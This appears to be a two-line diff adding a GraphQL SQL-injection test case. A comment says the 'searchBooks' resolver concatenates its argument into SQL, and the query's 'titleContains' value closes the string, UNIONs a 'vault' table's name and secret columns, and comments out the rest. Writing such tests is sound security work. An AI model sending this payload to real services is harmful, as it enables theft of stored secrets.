@@ -1,0 +1,2 @@
+# searchBooks concatenates its argument into SQL: close the string, UNION another table, comment out the rest.
+{ searchBooks(titleContains: "zzz' union select name, secret from vault --") { id title } }
